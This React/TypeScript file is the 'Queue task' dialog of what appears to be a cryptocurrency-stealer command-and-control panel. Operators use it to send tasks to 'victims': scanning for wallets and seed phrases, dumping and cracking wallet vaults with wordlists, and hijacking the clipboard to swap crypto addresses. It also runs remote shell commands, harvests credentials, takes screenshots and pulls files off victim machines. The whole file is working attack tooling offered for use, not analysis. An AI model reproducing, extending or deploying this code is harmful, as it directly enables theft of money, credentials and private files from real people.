'use client';
import { useEffect, useState } from 'react';
import { toast } from 'sonner';
import { Dialog, DialogContent, DialogDescription, DialogTitle } from '@/components/ui/dialog';
import { Button } from '@/components/ui/button';
import { Input, Label, Select, Textarea } from '@/components/ui/input';
import { useApi, mutate } from '@/hooks/useApi';
import type { Task, Wallet } from '@/lib/types';
import { isWindows } from '@/lib/os';
import { humanError } from '@/lib/errors';

type Form = Record<string, unknown>;

const defaults: Record<string, Form> = {
  scan_wallets: { include_desktop: true, include_extensions: true, include_seeds: true, max_files: 4000, max_bytes: 268435456 },
  dump_vault: { target: '' },
  crack_vault: { target: '', max_seconds: 90, wordlist: '' },
  clip_start: { replace: false, max_history: 500, coins: '' },
  clip_stop: {},
  shell: { command: 'whoami' },
  harvest: {},
  screenshot: {},
  file_pull: { path: '', max_mb: 64 }
};

const timeouts: Record<string, number> = {
  scan_wallets: 300,
  dump_vault: 300,
  crack_vault: 180,
  harvest: 180,
  shell: 60,
  screenshot: 60,
  file_pull: 120,
  clip_start: 30,
  clip_stop: 30
};

const WINDOWS_ONLY = new Set(['memdump', 'hives', 'bootstrap', 'keys']);

export function TaskDialog({
  open,
  onOpenChange,
  victimIds,
  victims,
  linked = true
}: {
  open: boolean;
  onOpenChange: (open: boolean) => void;
  victimIds: string[];
  victims?: Array<{ id: string; hostname: string; os?: string }>;
  linked?: boolean;
}) {
  const [name, setName] = useState('scan_wallets');
  const [form, setForm] = useState<Form>(defaults.scan_wallets!);
  const [priority, setPriority] = useState(0);
  const [timeout, setTimeoutSec] = useState(300);
  const [busy, setBusy] = useState(false);
  const [listing, setListing] = useState('');
  const [lsBusy, setLsBusy] = useState(false);
  const single = victimIds.length === 1 ? victimIds[0] : null;
  const wallets = useApi<{ items: Wallet[] }>(single ? `/victims/${single}/wallets` : null);
  const targets = [...new Set((wallets.data?.items ?? []).map((wallet) => wallet.targetId))];

  useEffect(() => {
    if (name === 'dump_vault' || name === 'crack_vault') {
      if (!form.target && targets[0]) setForm((current) => ({ ...current, target: targets[0]! }));
    }
  }, [targets.join(',')]); // eslint-disable-line react-hooks/exhaustive-deps

  function params(): Form {
    const out: Form = { ...form };
    if (name === 'clip_start') {
      const coins: Record<string, string[]> = {};
      for (const line of String(form.coins ?? '').split('\n')) {
        const at = line.indexOf(':');
        if (at < 0) continue;
        const coin = line.slice(0, at).trim().toLowerCase();
        const values = line.slice(at + 1).split(',').map((value) => value.trim()).filter(Boolean);
        if (coin && values.length > 0) coins[coin] = values;
      }
      if (Object.keys(coins).length === 0) delete out.coins;
      else out.coins = coins;
    }
    return out;
  }

  async function browse() {
    if (!single || name !== 'file_pull') return;
    setLsBusy(true);
    try {
      const response = await mutate<{ items: Task[] }>('/tasks', 'POST', {
        victim_ids: [single], name: 'agent', params: { command: `ls ${String(form.path ?? '')}`.trim() }, timeout_sec: 30
      });
      const id = response.items[0]!.id;
      for (let attempt = 0; attempt < 15; attempt++) {
        await new Promise((resolve) => window.setTimeout(resolve, 700));
        const task = await fetch(`/api/console/tasks?victim=${single}&name=agent&limit=1`).then((r) => r.json()) as { items: Task[] };
        const match = task.items.find((item) => item.id === id);
        if (match && ['done', 'error', 'unknown', 'expired'].includes(match.status)) {
          setListing(match.status === 'done'
            ? String((match.result as { output?: string } | null)?.output ?? '')
            : match.error ?? match.status);
          break;
        }
      }
    } catch (caught) {
      toast.error(humanError(caught) || 'listing failed');
    } finally {
      setLsBusy(false);
    }
  }

  async function submit(event: React.FormEvent) {
    event.preventDefault();
    if (busy) return;
    setBusy(true);
    try {
      const chosen = names.includes(name) ? name : names[0]!;
      await mutate<{ items: Task[] }>('/tasks', 'POST', {
        victim_ids: victimIds, name: chosen, params: params(), priority, timeout_sec: timeout
      });
      toast.success(`Queued ${chosen} on ${victimIds.length} victim(s)`);
      onOpenChange(false);
    } catch (error) {
      toast.error(humanError(error) || 'Queue failed');
    } finally {
      setBusy(false);
    }
  }

  const names = linked ? Object.keys(defaults) : Object.keys(defaults);
  const os = victims?.map((victim) => victim.os).filter(Boolean) ?? [];
  const windowsHint = WINDOWS_ONLY.has(name) && os.length > 0 && os.every((value) => !isWindows(value));

  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent>
        <DialogTitle>Queue task</DialogTitle>
        <DialogDescription>
          {victimIds.length} victim(s){victims ? `: ${victims.map((victim) => victim.hostname).slice(0, 4).join(', ')}${victims.length > 4 ? '…' : ''}` : ''}
          {windowsHint ? ' · Windows only' : ''}
        </DialogDescription>
        <form onSubmit={submit} className="mt-3 space-y-2.5">
          <div>
            <Label htmlFor="task-name">Task</Label>
            <Select id="task-name" value={name} onChange={(event) => {
              const next = event.target.value;
              setName(next);
              setForm({ ...(defaults[next] ?? {}) });
              setTimeoutSec(timeouts[next] ?? 120);
            }} className="w-full">
              {names.map((task) => <option key={task} value={task}>{task}</option>)}
            </Select>
          </div>

          {name === 'scan_wallets' ? (
            <div className="grid grid-cols-2 gap-2">
              <div><Label htmlFor="max-files">max_files</Label><Input id="max-files" type="number" min={1} max={20000} value={Number(form.max_files ?? 4000)} onChange={(event) => setForm({ ...form, max_files: Number(event.target.value) })} /></div>
              <div><Label htmlFor="max-bytes">max_bytes</Label><Input id="max-bytes" type="number" min={1048576} max={536870912} step={1048576} value={Number(form.max_bytes ?? 268435456)} onChange={(event) => setForm({ ...form, max_bytes: Number(event.target.value) })} /></div>
              {(['include_desktop', 'include_extensions', 'include_seeds'] as const).map((key) => (
                <label key={key} className="flex items-center gap-2 text-xs">
                  <input type="checkbox" checked={form[key] !== false} onChange={(event) => setForm({ ...form, [key]: event.target.checked })} /> {key}
                </label>
              ))}
            </div>
          ) : null}

          {name === 'dump_vault' || name === 'crack_vault' ? (
            <div>
              <Label htmlFor="target">Target wallet (from this victim)</Label>
              {targets.length > 0 ? (
                <Select id="target" value={String(form.target ?? '')} onChange={(event) => setForm({ ...form, target: event.target.value })} className="w-full">
                  {targets.map((target) => <option key={target} value={target}>{target}</option>)}
                </Select>
              ) : (
                <Input id="target" value={String(form.target ?? '')} placeholder="metamask" onChange={(event) => setForm({ ...form, target: event.target.value })} />
              )}
              {name === 'crack_vault' ? (
                <div className="mt-2 grid grid-cols-2 gap-2">
                  <div><Label htmlFor="seconds">max_seconds</Label><Input id="seconds" type="number" min={5} max={600} value={Number(form.max_seconds ?? 90)} onChange={(event) => setForm({ ...form, max_seconds: Number(event.target.value) })} /></div>
                  <div><Label htmlFor="wordlist">wordlist (ruta)</Label><Input id="wordlist" value={String(form.wordlist ?? '')} onChange={(event) => setForm({ ...form, wordlist: event.target.value })} /></div>
                </div>
              ) : null}
            </div>
          ) : null}

          {name === 'clip_start' ? (
            <div className="space-y-2">
              <label className="flex items-center gap-2 text-xs"><input type="checkbox" checked={Boolean(form.replace)} onChange={(event) => setForm({ ...form, replace: event.target.checked })} /> replace addresses</label>
              <div><Label htmlFor="max-history">max_history</Label><Input id="max-history" type="number" min={16} max={5000} value={Number(form.max_history ?? 500)} onChange={(event) => setForm({ ...form, max_history: Number(event.target.value) })} /></div>
              <div><Label htmlFor="coins">coins (coin:addr1,addr2 por línea)</Label><Textarea id="coins" value={String(form.coins ?? '')} onChange={(event) => setForm({ ...form, coins: event.target.value })} className="font-mono" /></div>
            </div>
          ) : null}

          {name === 'shell' ? (
            <div><Label htmlFor="command">command</Label><Textarea id="command" value={String(form.command ?? '')} onChange={(event) => setForm({ ...form, command: event.target.value })} className="font-mono" /></div>
          ) : null}

          {name === 'file_pull' ? (
            <div className="space-y-2">
              <div><Label htmlFor="path">path</Label><Input id="path" value={String(form.path ?? '')} onChange={(event) => setForm({ ...form, path: event.target.value })} className="font-mono" /></div>
              <div className="flex items-end gap-2">
                <div className="flex-1"><Label htmlFor="max-mb">max_mb</Label><Input id="max-mb" type="number" min={1} max={256} value={Number(form.max_mb ?? 64)} onChange={(event) => setForm({ ...form, max_mb: Number(event.target.value) })} /></div>
                <Button type="button" variant="secondary" loading={lsBusy} disabled={!single || lsBusy} onClick={browse}>list</Button>
              </div>
              {listing ? <pre className="max-h-32 overflow-auto rounded border border-line bg-bg p-2 font-mono text-2xs">{listing}</pre> : null}
            </div>
          ) : null}

          <div className="grid grid-cols-2 gap-2">
            <div><Label htmlFor="priority">Priority</Label><Input id="priority" type="number" min={-10} max={10} value={priority} onChange={(event) => setPriority(Number(event.target.value))} /></div>
            <div><Label htmlFor="timeout">Timeout (s)</Label><Input id="timeout" type="number" min={1} max={3600} value={timeout} onChange={(event) => setTimeoutSec(Number(event.target.value))} /></div>
          </div>
          <div className="flex justify-end gap-2 pt-1">
            <Button type="button" variant="ghost" onClick={() => onOpenChange(false)}>Cancel</Button>
            <Button type="submit" loading={busy} disabled={victimIds.length === 0 || busy}>Queue</Button>
          </div>
        </form>
      </DialogContent>
    </Dialog>
  );
}
